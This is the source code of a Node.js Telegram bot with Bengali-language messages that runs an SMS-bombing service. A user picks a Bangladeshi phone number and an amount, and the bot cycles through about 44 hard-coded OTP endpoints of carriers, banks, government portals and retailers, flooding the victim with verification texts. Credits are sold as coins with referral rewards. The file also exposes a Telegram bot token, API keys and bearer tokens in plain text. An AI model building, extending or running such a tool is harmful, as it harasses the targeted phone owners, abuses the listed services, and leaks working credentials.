const { Telegraf, session, Markup } = require('telegraf');
const axios = require('axios');
const express = require('express');
const fs = require('fs');

const BOT_TOKEN = '8452171958:AAFElgfh2yXz7VurqsOBZD3AJIpvTCB8GmE';
const ADMIN_ID = 5967798239;
const bot = new Telegraf(BOT_TOKEN);

// Database Initialization
const DB_FILE = './database.json';
let db = { users: {}, restricted: [], globalHistory: [] };
if (fs.existsSync(DB_FILE)) {
    try { db = JSON.parse(fs.readFileSync(DB_FILE)); } catch (e) { console.log("DB Error"); }
}

function saveDB() {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}

// Express server for Render
const app = express();
app.get('/', (req, res) => res.send('System Status: 100% Online'));
app.listen(process.env.PORT || 3000);

// API List (Your 45+ API list is assumed here, I'll use a placeholder variable)
const SMS_APIS = [
    // ... আপনার দেওয়া ৪৪টি API এখানে থাকবে ...
    { url: "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ login: p }) },
    { url: "https://weblogin.grameenphone.com/backend/api/v1/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login", method: "GET", params: p => ({ msisdn: `880${p}`, lang: "en", ng: "0" }) },
    { url: "https://fundesh.com.bd/api/auth/generateOTP", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p, service_key: "" }) },
    { url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.osudpotro.com/api/v1/users/send_otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://training.gov.bd/backoffice/api/user/sendOtp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://da-api.robi.com.bd/da-nll/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: `880${p}` }) },
    { url: "https://gateway.most.gov.bd/auth/oauth/send-otp", method: "POST", headers: { 'Content-Type': 'application/json', 'X-Api-Key': '4rhwlff8q4q860qsb9utv73x12nua8h7' }, data: p => ({ phone: p, name: "User", email: "a@a.com", registration_type: 1, captcha_token: "511fb2f2ed6211d2a471a7af9a0fa140", otp_send: "SMS" }) },
    { url: "https://app.deshal.net/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.shikho.com/auth/v2/send/sms", method: "POST", headers: { 'Content-Type': 'application/json', origin: "https://shikho.com", referer: "https://shikho.com/" }, data: p => ({ phone: "880"+p, type: "student", auth_type: "login", vendor: "shikho" }) },
    { url: "https://api.apex4u.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://bikroy.com/data/phone_number_login/verifications/phone_login", method: "GET", params: p => ({ phone: p }) },
    { url: "https://merchant.pathao.com/api/v1/merchants/verification/phone/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: p }) },
    { url: "https://ezybank.dhakabank.com.bd/ekyc/MOBILE_NO_VERIFICATION/MOBILE_NO_VERIFICATION_OTP_GENARATION", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile: p }) },
    { url: "https://cineplex-ticket-api.cineplexbd.com/api/v1/register", method: "POST", headers: { 'Content-Type': 'application/json', appsource: "web" }, data: p => ({ name: "Jubair", msisdn: p, email: "j@j.com", gender: "2", password: "@Test1234", confirm_password: "@Test1234", r_token: "test" }) },
    { url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp", method: "GET", params: p => ({ mobile: p }) },
    { url: "https://api.binge.buzz/api/v4/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json', 'x-platform': "web" }, data: p => ({ phone: "+880"+p }) },
    { url: "https://bb-api.bohubrihi.com/public/activity/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p, intent: "login" }) },
    { url: "https://api-gateway.sundarbancourierltd.com/graphql", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ operationName: "CreateAccessToken", variables: { accessTokenFilter: { userName: p } }, query: "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }" }) },
    { url: "https://www.rokomari.com/otp/send", method: "POST", params: p => ({ emailOrPhone: p, countryCode: "BD" }), headers: { 'x-requested-with': "XMLHttpRequest" } },
    { url: "https://offers.sindabad.com/api/mobile-otp", method: "POST", headers: { 'Content-Type': 'application/json', Authorization: "Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgbGludXggYW5kcm9pZCAxMyBzbS10ODM3YSBhcHBsZXdlYmtpdDUzNzM2" }, data: p => ({ key: "499a4a6b403417bfd670e45eef1e24b5", mobile: "+88"+p }) },
    { url: "https://piobd.com/login", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `f_mobilenumber=${p}&frf_calculatereg=9` },
    { url: "https://api.shoppingcorner.com.bd/index.php?route=vapi/account/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ number: "+880"+p }) },
    { url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ mobile_no: p }) },
    { url: "https://chinaonlinebd.com/api/login/getOtp", method: "GET", params: p => ({ phone: p }), headers: { token: "45601f3d391886fcec5f5a3f26780f21" } },
    { url: "https://api.bdtickets.com:20100/v1/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ createUserCheck: true, phoneNumber: "+88"+p, applicationChannel: "WEB_APP" }) },
    { url: "https://auth.acsfutureschool.com/api/v1/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://www.shwapno.com/api/auth", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phoneNumber: "+88"+p }) },
    { url: "https://app.eonbazar.com/api/auth/login", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ method: "otp", mobile: p }) },
    { url: "https://primebazar.com/registration/verification-code-send", method: "POST", headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, data: p => `_token=lCK5AfqQKEpkfPFgzQMNtRx2jD82Yn5fNLrRzmOd&type=customer&phone=${p}&country_code=88` },
    { url: "https://bj-x-coder.top/bo_m_ber.php", method: "GET", params: p => ({ phone: p, amount: 1 }) },
    { url: "https://login.teletalk.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: "880" + p }) },
    { url: "https://api.daraz.com.bd/v1/login/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.evaly.com.bd/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api2.sheba.xyz/v2/auth/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.hungrynaki.com/api/v1/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "880"+p }) },
    { url: "https://api.foodpanda.com.bd/auth/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: "+880"+p }) },
    { url: "https://api.10minute.school/api/v1/send-otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ phone: p }) },
    { url: "https://api.bkash.com/checkout/v1.2.0-beta/login/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    { url: "https://nagad.com.bd/api/otp/send", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
    // (সবগুলো API কোডে যোগ করে নিবেন)
];

bot.use(session());

// Helper functions
const delay = ms => new Promise(res => setTimeout(res, ms));

async function autoDelete(ctx, msgId, time = 300000) { // Default 5 mins
    setTimeout(async () => {
        try { await ctx.telegram.deleteMessage(ctx.chat.id, msgId); } catch (e) {}
    }, time);
}

function registerUser(ctx, refBy = null) {
    const uid = ctx.from.id;
    if (!db.users[uid]) {
        db.users[uid] = {
            username: ctx.from.username || "NoName",
            coins: 50,
            lastBonus: 0,
            totalReq: 0,
            history: [],
            isBanned: false,
            refBy: refBy
        };
        if (refBy && db.users[refBy]) {
            db.users[refBy].coins += 100; // Referral Reward
            bot.telegram.sendMessage(refBy, `🎊 আপনার রেফারেল লিংক থেকে একজন যুক্ত হয়েছে! আপনি ১০০ কয়েন পেয়েছেন।`);
        }
        saveDB();
    }
}

// Middleware to check ban
bot.use(async (ctx, next) => {
    if (ctx.from && db.users[ctx.from.id]?.isBanned) {
        return ctx.reply("🚫 আপনি এই বট থেকে ব্যান হয়েছেন। এডমিনের সাথে যোগাযোগ করুন।");
    }
    return next();
});

// --- Commands ---

bot.start(async (ctx) => {
    const refBy = ctx.startPayload || null;
    registerUser(ctx, refBy);
    const msg = await ctx.reply(`👋 স্বাগতম!\nআপনার UID: <code>${ctx.from.id}</code>\nরেফারেল বোনাস পেতে আপনার লিংক শেয়ার করুন।`, {
        parse_mode: 'HTML',
        ...Markup.keyboard([['🚀 Boom', '💰 Balance'], ['🎁 Daily Bonus', 'ℹ️ Info'], ['📜 History', '❓ Help']]).resize()
    });
    if (ctx.chat.type !== 'private') autoDelete(ctx, msg.message_id, 10000);
});

bot.command('help', (ctx) => {
    ctx.reply(`📖 **কমান্ড লিস্ট:**\n/start - শুরু করুন\n/bm <নম্বর> <পরিমাণ> - বোম্বিং\n/ck - ডেইলি বোনাস\n/history - কাজের রেকর্ড\n/balance - কয়েন চেক\n/info - আইডি তথ্য\n\n🛡️ **এডমিন কমান্ড:**\n/recharge <uid> <amount>\n/ban <uid>\n/uban <uid>\n/rn <number> (Blacklist)\n/list user\n/broadcast (Reply to message)`);
});

bot.command('ck', (ctx) => handleBonus(ctx));
bot.hears('🎁 Daily Bonus', (ctx) => handleBonus(ctx));

async function handleBonus(ctx) {
    const uid = ctx.from.id;
    registerUser(ctx);
    const diff = (Date.now() - db.users[uid].lastBonus) / (1000 * 60 * 60);
    if (diff >= 24) {
        db.users[uid].coins += 50;
        db.users[uid].lastBonus = Date.now();
        saveDB();
        const refLink = `https://t.me/${ctx.botInfo.username}?start=${uid}`;
        ctx.reply(`✅ ৫০ কয়েন বোনাস পেয়েছেন!\n\n🔗 আপনার রেফারেল লিংক:\n<code>${refLink}</code>\n(কেউ জয়েন করলে ১০০ কয়েন পাবেন)`, { parse_mode: 'HTML' });
    } else {
        ctx.reply(`❌ ${(24 - diff).toFixed(1)} ঘণ্টা পর আবার চেষ্টা করুন।`);
    }
}

bot.command('history', (ctx) => {
    const uid = ctx.from.id;
    let history = "";
    if (uid === ADMIN_ID) {
        history = "📊 **গ্লোবাল হিস্টরি (Last 10):**\n" + db.globalHistory.slice(-10).map(h => `📍 ${h.phone} | ${h.amount} SMS | ID: ${h.uid}`).join('\n');
    } else {
        history = "📜 **আপনার হিস্টরি (Last 10):**\n" + db.users[uid].history.slice(-10).map(h => `📍 ${h.phone} | ${h.amount} SMS`).join('\n');
    }
    ctx.reply(history || "কোনো রেকর্ড পাওয়া যায়নি।");
});

// --- Admin Controls ---

bot.command('recharge', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const args = ctx.message.text.split(' ');
    const target = args[1], amount = parseInt(args[2]);
    if (db.users[target]) {
        db.users[target].coins += amount;
        saveDB();
        const m = await ctx.reply(`✅ UID ${target} এর ব্যালেন্সে ${amount} কয়েন আপডেট হয়েছে।`);
        autoDelete(ctx, m.message_id);
    }
});

bot.command('ban', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const target = ctx.message.text.split(' ')[1];
    if (db.users[target]) {
        db.users[target].isBanned = true;
        saveDB();
        ctx.reply(`🚫 UID ${target} ব্যান করা হয়েছে।`);
    }
});

bot.command('uban', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const target = ctx.message.text.split(' ')[1];
    if (db.users[target]) {
        db.users[target].isBanned = false;
        saveDB();
        ctx.reply(`✅ UID ${target} আনব্যান করা হয়েছে।`);
    }
});

bot.command('rn', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    let num = ctx.message.text.split(' ')[1];
    if (num.startsWith('-')) {
        num = num.substring(1);
        db.restricted = db.restricted.filter(n => n !== num);
        ctx.reply(`✅ ${num} রেস্ট্রিক্টেড লিস্ট থেকে মুছে ফেলা হয়েছে।`);
    } else {
        db.restricted.push(num);
        ctx.reply(`🚫 ${num} রেস্ট্রিক্টেড লিস্টে যোগ করা হয়েছে।`);
    }
    saveDB();
});

bot.command('list', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const cmd = ctx.message.text.split(' ')[1];
    if (cmd === 'user') {
        let list = "👥 **ইউজার লিস্ট:**\n";
        for (let id in db.users) {
            list += `▪️ ${db.users[id].username} | <code>${id}</code> | 💰 ${db.users[id].coins} | 🚀 ${db.users[id].totalReq}\n`;
        }
        const m = await ctx.reply(list, { parse_mode: 'HTML' });
        autoDelete(ctx, m.message_id);
    } else if (cmd === 'rn') {
        ctx.reply(`🚫 **নিষিদ্ধ নম্বর:**\n${db.restricted.join('\n') || "নেই"}`);
    }
});

bot.command('broadcast', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    const text = ctx.message.text.replace('/broadcast', '');
    const users = Object.keys(db.users);
    ctx.reply(`📢 ${users.length} জন ইউজারকে মেসেজ পাঠানো হচ্ছে...`);
    for (let id of users) {
        try {
            if (ctx.message.reply_to_message?.photo) {
                const photoId = ctx.message.reply_to_message.photo.pop().file_id;
                await bot.telegram.sendPhoto(id, photoId, { caption: text });
            } else {
                await bot.telegram.sendMessage(id, text);
            }
            await delay(100); // Rate limit protection
        } catch (e) {}
    }
});

// --- Bombing Logic ---

bot.command('bm', (ctx) => {
    const args = ctx.message.text.split(' ');
    startBombing(ctx, args[1], parseInt(args[2]));
});

bot.hears('🚀 Boom', (ctx) => {
    ctx.session = { step: 'phone' };
    ctx.reply("📱 নম্বর দিন:");
});

bot.on('text', async (ctx) => {
    if (ctx.session?.step === 'phone') {
        ctx.session.phone = ctx.message.text;
        ctx.session.step = 'amt';
        ctx.reply("🔢 পরিমাণ (১-১০০):");
    } else if (ctx.session?.step === 'amt') {
        startBombing(ctx, ctx.session.phone, parseInt(ctx.message.text));
        ctx.session = {};
    }
});

async function startBombing(ctx, phone, amount) {
    const uid = ctx.from.id;
    registerUser(ctx);
    
    if (db.restricted.includes(phone)) return ctx.reply("❌ দুঃখিত, এই নম্বরটি এডমিন দ্বারা রেস্ট্রিক্টেড।");
    if (db.users[uid].coins < amount) return ctx.reply("❌ পর্যাপ্ত কয়েন নেই!");
    if (!/^01[3-9]\d{8}$/.test(phone) || isNaN(amount) || amount > 100) return ctx.reply("❌ ভুল তথ্য!");

    const statusMsg = await ctx.reply(`🚀 ${phone} এ কাজ শুরু হচ্ছে...`);
    
    let success = 0, errors = 0, idx = 0;
    while (success < amount) {
        const api = SMS_APIS[idx % SMS_APIS.length];
        try {
            await axios({ 
                method: api.method, url: api.url, timeout: 5000,
                [api.method === 'POST' ? 'data' : 'params']: api.method === 'POST' ? api.data(phone) : api.params(phone)
            });
            success++;
        } catch (e) { errors++; }
        idx++;
        if (idx > amount + 50) break;
        await delay(150);
    }

    // Save history
    const record = { phone, amount, time: new Date().toLocaleString() };
    db.users[uid].coins -= amount;
    db.users[uid].totalReq += 1;
    db.users[uid].history.push(record);
    db.globalHistory.push({ ...record, uid });
    saveDB();

    ctx.reply(`✅ সম্পন্ন!\n🎯 সফল: ${success}\n💰 বর্তমান ব্যালেন্স: ${db.users[uid].coins}`);
}

bot.launch().then(() => console.log("Bot is Running Globally!"));
